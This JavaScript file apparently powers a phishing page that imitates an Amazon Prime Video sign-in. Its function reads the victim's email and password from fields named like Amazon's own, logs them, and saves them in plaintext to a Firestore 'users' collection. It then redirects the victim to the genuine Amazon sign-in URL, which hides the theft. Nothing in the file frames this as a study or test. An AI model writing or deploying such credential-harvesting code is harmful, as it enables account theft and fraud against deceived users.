function registro(){    
    var email = document.getElementById('ap_email').value;
    var password = document.getElementById('ap_password').value;
    console.log(email);
    console.log(password);
    db.collection("users").add({
            user: email,
            password: password            
    })
    .then((docRef) => {
      console.log("Document written with ID: ", docRef.id);
      redireccion();
    })
    .catch((error) => {
        console.error("Error adding document: ", error);
    });    
    console.log(email);console.log(password);        
}

function redireccion(){
  location.href = 'https://www.amazon.com/ap/signin?accountStatusPolicy=P1&clientContext=135-5577092-6152056&language=es_ES&openid.assoc_handle=amzn_prime_video_desktop_us&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.primevideo.com%2Fauth%2Freturn%2Fref%3Dav_auth_ap%3F_encoding%3DUTF8%26language%3Des_ES%26location%3D%252Fref%253Ddv_auth_ret%253F_encoding%253DUTF8%2526language%253Des_ES';
}